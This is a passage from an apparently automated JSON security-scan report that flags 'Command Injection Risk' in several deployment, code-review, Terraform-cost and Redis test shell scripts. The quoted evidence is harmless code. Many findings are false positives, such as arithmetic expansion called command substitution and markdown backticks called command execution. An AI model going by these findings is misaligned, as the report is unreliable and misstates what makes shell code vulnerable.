        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 195,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 197,
        "issue": "Command substitution in shell",
        "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|server_error|${http_code}|${duration}ms\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 201,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_REQUESTS=$((FAILED_REQUESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 203,
        "issue": "Command substitution in shell",
        "evidence": "ERRORS+=(\"$(date -u +%Y-%m-%dT%H:%M:%SZ)|client_error|${http_code}|${duration}ms\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 213,
        "issue": "Command substitution in shell",
        "evidence": "http_code=$(curl -s -o /dev/null -w \"%{http_code}\" --max-time \"$TIMEOUT\" \"$health_url\" 2>/dev/null || echo \"000\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 231,
        "issue": "Command substitution in shell",
        "evidence": "start_time=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 232,
        "issue": "Command substitution in shell",
        "evidence": "end_time=$((start_time + DURATION))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 247,
        "issue": "Command substitution in shell",
        "evidence": "while [[ $(date +%s) -lt $end_time ]]; do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 248,
        "issue": "Command substitution in shell",
        "evidence": "elapsed=$(($(date +%s) - start_time))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 260,
        "issue": "Command substitution in shell",
        "evidence": "concurrent_success=$((concurrent_success + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 262,
        "issue": "Command substitution in shell",
        "evidence": "concurrent_failed=$((concurrent_failed + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "if [[ $concurrent_failed -gt $((CONCURRENT_REQUESTS / 2)) ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 271,
        "issue": "Command substitution in shell",
        "evidence": "downtime_start=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 280,
        "issue": "Command substitution in shell",
        "evidence": "downtime_end=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 281,
        "issue": "Command substitution in shell",
        "evidence": "local downtime_duration=$((downtime_end - downtime_start))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 282,
        "issue": "Command substitution in shell",
        "evidence": "DOWNTIME_SECONDS=$((DOWNTIME_SECONDS + downtime_duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 295,
        "issue": "Command substitution in shell",
        "evidence": "downtime_end=$(date +%s)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 296,
        "issue": "Command substitution in shell",
        "evidence": "local downtime_duration=$((downtime_end - downtime_start))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 297,
        "issue": "Command substitution in shell",
        "evidence": "DOWNTIME_SECONDS=$((DOWNTIME_SECONDS + downtime_duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "avg_latency=$((TOTAL_LATENCY / TOTAL_REQUESTS))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 315,
        "issue": "Command substitution in shell",
        "evidence": "success_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($SUCCESSFUL_REQUESTS / $TOTAL_REQUESTS) * 100}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "error_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($FAILED_REQUESTS / $TOTAL_REQUESTS) * 100}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 317,
        "issue": "Command substitution in shell",
        "evidence": "timeout_rate=$(awk \"BEGIN {printf \\\"%.2f\\\", ($TIMEOUTS / $TOTAL_REQUESTS) * 100}\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 326,
        "issue": "Command substitution in shell",
        "evidence": "metrics=$(calculate_metrics)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 348,
        "issue": "Command substitution in shell",
        "evidence": "\"downtime_percentage\": $(awk \"BEGIN {printf \\\"%.2f\\\", ($DOWNTIME_SECONDS / $DURATION) * 100}\"),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 349,
        "issue": "Command substitution in shell",
        "evidence": "\"zero_downtime\": $(if [[ $DOWNTIME_SECONDS -eq 0 ]]; then echo \"true\"; else echo \"false\"; fi),",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 351,
        "issue": "Command substitution in shell",
        "evidence": "$(printf '    \"%s\"' \"${ERRORS[@]}\" | paste -sd ',' -)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 377,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Percentage: $(awk \"BEGIN {printf \\\"%.2f\\\", ($DOWNTIME_SECONDS / $DURATION) * 100}\")%\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 378,
        "issue": "Command substitution in shell",
        "evidence": "echo \"  Zero-downtime: $(if [[ $DOWNTIME_SECONDS -eq 0 ]]; then echo \"${GREEN}YES${NC}\"; else echo \"${RED}NO${NC}\"; fi)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 422,
        "issue": "Command substitution in shell",
        "evidence": "if [[ $(awk \"BEGIN {print ($error_rate > 1.0)}\") -eq 1 ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/deployment-strategies/resources/scripts/test_deployment.sh",
        "line_number": 483,
        "issue": "Command substitution in shell",
        "evidence": "elif [[ $DOWNTIME_SECONDS -gt 60 ]] || [[ $FAILED_REQUESTS -gt $((TOTAL_REQUESTS / 10)) ]]; then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 120,
        "issue": "Command substitution in shell",
        "evidence": "**Date:** $(date -u +\"%Y-%m-%d %H:%M:%S UTC\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 280,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Context managers for resource management (`with` statements)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 281,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Exceptions used properly (not bare `except:`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 298,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `ruff check` passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 299,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `mypy` passes (if using type hints)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 300,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `bandit` security check passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 323,
        "issue": "Backtick command execution",
        "evidence": "- [ ] No `any` types (use unknown or proper types)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 338,
        "issue": "Backtick command execution",
        "evidence": "- [ ] No security vulnerabilities (`npm audit`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 347,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `cargo fmt` applied",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 348,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `cargo clippy` warnings addressed",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 385,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `gofmt` applied",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 386,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `go vet` passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 387,
        "issue": "Backtick command execution",
        "evidence": "- [ ] `golangci-lint` passes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 392,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Error handling explicit (no `_` without reason)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 405,
        "issue": "Backtick command execution",
        "evidence": "- [ ] Race detector passes (`go test -race`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 479,
        "issue": "Command substitution in shell",
        "evidence": "\"generated_at\": \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/generate_review_checklist.sh",
        "line_number": 609,
        "issue": "Command substitution in shell",
        "evidence": "output=$(generate_checklist \"$PR_TYPE\" \"$LANGUAGE\" \"$OUTPUT_FORMAT\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 97,
        "issue": "Command substitution in shell",
        "evidence": "PLAN_FILE=\"tfplan-$(date +%s)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 170,
        "issue": "Command substitution in shell",
        "evidence": "\"timeGenerated\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 200,
        "issue": "Command substitution in shell",
        "evidence": "local type=$(echo \"$resource\" | jq -r '.type')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 201,
        "issue": "Command substitution in shell",
        "evidence": "local name=$(echo \"$resource\" | jq -r '.name')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 202,
        "issue": "Command substitution in shell",
        "evidence": "local instance_type=$(echo \"$resource\" | jq -r '.change.after.instance_type // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 211,
        "issue": "Command substitution in shell",
        "evidence": "total_monthly=$(echo \"$total_monthly + $cost\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "--arg resources \"$(printf '%s,' \"${resources[@]}\" | sed 's/,$//')\" \\",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 228,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_cost=$(jq -r '.totalMonthlyCost' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 229,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_diff=$(jq -r '.diffTotalMonthlyCost // \"0\"' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 230,
        "issue": "Command substitution in shell",
        "evidence": "local hourly_cost=$(jq -r '.totalHourlyCost' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 238,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Generated: $(date)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 244,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$monthly_diff > 0\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 265,
        "issue": "Command substitution in shell",
        "evidence": "local detected=$(jq -r '.summary.totalDetectedResources // 0' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 266,
        "issue": "Command substitution in shell",
        "evidence": "local supported=$(jq -r '.summary.totalSupportedResources // 0' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 267,
        "issue": "Command substitution in shell",
        "evidence": "local unsupported=$(jq -r '.summary.totalUnsupportedResources // 0' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "local threshold_amount=$(echo \"$BUDGET * $ALERT_THRESHOLD / 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 277,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_int=$(echo \"$monthly_cost\" | cut -d. -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 304,
        "issue": "Command substitution in shell",
        "evidence": "echo \"Total,,$( jq -r '.totalMonthlyCost' infracost.json),$( jq -r '.totalHourlyCost' infracost.json)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "local prev_cost=$(jq -r '.totalMonthlyCost' \"$COMPARE_FILE\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 315,
        "issue": "Command substitution in shell",
        "evidence": "local curr_cost=$(jq -r '.totalMonthlyCost' infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 316,
        "issue": "Command substitution in shell",
        "evidence": "local diff=$(echo \"$curr_cost - $prev_cost\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 317,
        "issue": "Command substitution in shell",
        "evidence": "local pct_change=$(echo \"scale=2; ($diff / $prev_cost) * 100\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 327,
        "issue": "Command substitution in shell",
        "evidence": "if (( $(echo \"$diff > 0\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "elif (( $(echo \"$diff < 0\" | bc -l) )); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 403,
        "issue": "Command substitution in shell",
        "evidence": "output=$(cat infracost.json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 406,
        "issue": "Command substitution in shell",
        "evidence": "output=$(format_csv)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 409,
        "issue": "Command substitution in shell",
        "evidence": "output=$(format_table)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "output=\"$output$(echo)$(compare_estimates)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/scripts/cost_estimate.sh",
        "line_number": 430,
        "issue": "Command substitution in shell",
        "evidence": "local monthly_cost=$(jq -r '.totalMonthlyCost' infracost.json | cut -d. -f1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 29,
        "issue": "Command substitution in shell",
        "evidence": "Usage: $(basename \"$0\") [OPTIONS]",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 46,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 49,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --pattern cache",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 52,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --json",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 55,
        "issue": "Command substitution in shell",
        "evidence": "$(basename \"$0\") --host redis.example.com --port 6380 --password secret",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 174,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 188,
        "issue": "Command substitution in shell",
        "evidence": "local retrieved=$($REDIS_CMD GET \"$key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 196,
        "issue": "Command substitution in shell",
        "evidence": "local ttl=$($REDIS_CMD TTL \"$key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 209,
        "issue": "Command substitution in shell",
        "evidence": "local exists=$($REDIS_CMD EXISTS \"$key\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 218,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 219,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 229,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 244,
        "issue": "Command substitution in shell",
        "evidence": "local length=$($REDIS_CMD LLEN \"$queue\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 255,
        "issue": "Command substitution in shell",
        "evidence": "local item=$($REDIS_CMD RPOP \"$queue\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "local task=$($REDIS_CMD RPOPLPUSH \"$pending_queue\" \"$processing_queue\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/test_patterns.sh",
        "line_number": 287,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
